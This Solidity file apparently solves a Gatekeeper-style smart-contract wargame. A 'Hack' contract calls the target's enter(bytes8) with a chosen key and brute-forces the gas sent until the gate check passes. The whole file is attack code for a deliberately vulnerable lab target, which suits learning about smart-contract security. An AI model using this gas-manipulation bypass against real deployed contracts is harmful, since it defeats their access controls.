// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    event Log(uint256);
    event Attempt(uint256, bool);

    constructor() {
    }

  

function hack(address addr,uint64 val) public {
    emit Log(1);
    (bool success, bytes memory data) = addr.call{gas: 24823}(abi.encodeWithSignature("enter(bytes8)", bytes8(val)));
    emit Log(2);
    if (!success) {
        assembly {
            revert(add(data, 32), mload(data))
        }
    }
}


function bruteForce(address gatekeeperAddr, uint64 key) public {
        // Try many values close to a base value
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToSend = i + 8191 * 3; // base offset, adjust as needed
            (bool success, ) = gatekeeperAddr.call{gas: gasToSend}(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
            emit Attempt(gasToSend, success);
            if (success) break;
        }
    }


}
